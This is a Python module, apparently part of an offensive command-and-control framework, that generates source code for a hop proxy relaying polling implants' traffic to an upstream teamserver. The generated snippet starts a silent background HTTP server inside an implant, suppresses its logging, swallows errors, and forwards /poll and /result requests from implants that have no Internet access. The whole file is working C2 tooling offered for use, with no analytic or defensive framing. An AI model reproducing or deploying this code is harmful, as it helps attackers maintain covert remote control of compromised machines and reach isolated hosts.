#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""HTTP daisy-chain hop helpers for polling implants.

Implant A (with C2 reachability) can expose a local hop proxy; implant B
(no Internet) polls A; A forwards /poll and /result to the real teamserver.
"""

from __future__ import annotations

import hmac
import secrets
from typing import Optional, Tuple
from urllib.parse import urlparse

CHAIN_TOKEN_HEADER = "X-KS-Chain-Token"
CHAIN_VIA_HEADER = "X-KS-Chain-Via"


def generate_chain_token(nbytes: int = 16) -> str:
    """Return a URL-safe chain shared secret."""
    return secrets.token_urlsafe(nbytes)


def validate_chain_token(provided: Optional[str], expected: Optional[str]) -> bool:
    """Constant-time compare; empty expected means any/no token accepted."""
    exp = str(expected or "").strip()
    if not exp:
        return True
    got = str(provided or "").strip()
    if not got:
        return False
    return hmac.compare_digest(got, exp)


def parse_upstream_url(url: str, default_port: int = 8088) -> Tuple[str, int, str, bool]:
    """Parse ``http://host:port/prefix`` into (host, port, prefix, use_ssl)."""
    text = str(url or "").strip()
    if not text:
        raise ValueError("upstream URL is empty")
    if "://" not in text:
        text = "http://" + text
    parsed = urlparse(text)
    host = parsed.hostname or "127.0.0.1"
    use_ssl = parsed.scheme.lower() == "https"
    port = int(parsed.port or (443 if use_ssl else default_port))
    prefix = parsed.path or "/c2"
    if not prefix.startswith("/"):
        prefix = "/" + prefix
    prefix = "/" + prefix.strip("/")
    return host, port, prefix, use_ssl


def build_chain_hop_proxy_snippet(
    *,
    upstream_host: str,
    upstream_port: int,
    url_prefix: str = "/c2",
    listen_host: str = "0.0.0.0",
    listen_port: int = 18088,
    chain_token: str = "",
    via_id: str = "",
    use_ssl: bool = False,
) -> str:
    """Return Python source that starts a background hop proxy thread.

    Forwards only ``{prefix}/poll`` and ``{prefix}/result`` to the upstream C2.
    Child implants must send ``X-KS-Chain-Token`` when a token is configured.
    Assumes ``urllib.request`` / ``urllib.parse`` / ``threading`` / ``time`` exist.
    """
    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    return (
        "import threading\n"
        "from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer\n"
        f"UP_HOST={str(upstream_host)!r};UP_PORT={int(upstream_port)}\n"
        f"HOP_PREFIX={prefix!r};HOP_TOKEN={str(chain_token or '')!r};HOP_VIA={str(via_id or '')!r}\n"
        f"HOP_LISTEN_HOST={str(listen_host or '0.0.0.0')!r};HOP_LISTEN_PORT={int(listen_port)}\n"
        f"UP_BASE='{scheme}://'+UP_HOST+('' if UP_PORT in (80,443) else ':'+str(UP_PORT))\n"
        "def _hop_forward(method,path,qs,body,ctype):\n"
        " u=UP_BASE+path+(('?'+qs) if qs else '')\n"
        " hd={'User-Agent':'KittyHop/1.0'}\n"
        " if ctype: hd['Content-Type']=ctype\n"
        " if HOP_VIA: hd['X-KS-Chain-Via']=HOP_VIA\n"
        " r=urllib.request.Request(u,data=body,method=method,headers=hd)\n"
        " with urllib.request.urlopen(r,timeout=60) as resp:\n"
        "  return resp.status,resp.read(),resp.headers.get('Content-Type','application/json')\n"
        "class _HopHandler(BaseHTTPRequestHandler):\n"
        " def log_message(self,*a): return\n"
        " def _ok(self,status,data,ctype='application/json'):\n"
        "  b=data if isinstance(data,(bytes,bytearray)) else str(data).encode()\n"
        "  self.send_response(status);self.send_header('Content-Type',ctype)\n"
        "  self.send_header('Content-Length',str(len(b)));self.end_headers();self.wfile.write(b)\n"
        " def _auth(self):\n"
        "  if not HOP_TOKEN: return True\n"
        "  return (self.headers.get('X-KS-Chain-Token') or '')==HOP_TOKEN\n"
        " def do_GET(self):\n"
        "  p=urllib.parse.urlparse(self.path);path=p.path\n"
        "  if path!=(HOP_PREFIX+'/poll'): self._ok(404,b'not found','text/plain');return\n"
        "  if not self._auth(): self._ok(403,b'forbidden','text/plain');return\n"
        "  try:\n"
        "   st,data,ct=_hop_forward('GET',path,p.query,None,None); self._ok(st,data,ct or 'application/json')\n"
        "  except Exception as e: self._ok(502,('hop error: %s'%e).encode(),'text/plain')\n"
        " def do_POST(self):\n"
        "  p=urllib.parse.urlparse(self.path);path=p.path\n"
        "  if path!=(HOP_PREFIX+'/result'): self._ok(404,b'not found','text/plain');return\n"
        "  if not self._auth(): self._ok(403,b'forbidden','text/plain');return\n"
        "  n=int(self.headers.get('Content-Length') or 0); body=self.rfile.read(n) if n else None\n"
        "  ctype=self.headers.get('Content-Type') or 'application/json'\n"
        "  try:\n"
        "   st,data,ct=_hop_forward('POST',path,p.query,body,ctype); self._ok(st,data,ct or 'text/plain')\n"
        "  except Exception as e: self._ok(502,('hop error: %s'%e).encode(),'text/plain')\n"
        "def _start_hop():\n"
        " try:\n"
        "  srv=ThreadingHTTPServer((HOP_LISTEN_HOST,HOP_LISTEN_PORT),_HopHandler)\n"
        "  threading.Thread(target=srv.serve_forever,daemon=True).start()\n"
        " except Exception: pass\n"
        "_start_hop()\n"
    )


def build_standalone_chain_hop_script(
    upstream_host: str,
    upstream_port: int,
    *,
    url_prefix: str = "/c2",
    listen_host: str = "0.0.0.0",
    listen_port: int = 18088,
    chain_token: str = "",
    via_id: str = "",
    use_ssl: bool = False,
) -> str:
    """Full blocking script that only runs the hop proxy."""
    snippet = build_chain_hop_proxy_snippet(
        upstream_host=upstream_host,
        upstream_port=upstream_port,
        url_prefix=url_prefix,
        listen_host=listen_host,
        listen_port=listen_port,
        chain_token=chain_token,
        via_id=via_id,
        use_ssl=use_ssl,
    )
    return (
        "import time,urllib.request,urllib.parse\n"
        + snippet
        + "while True:\n"
        + " time.sleep(3600)\n"
    )
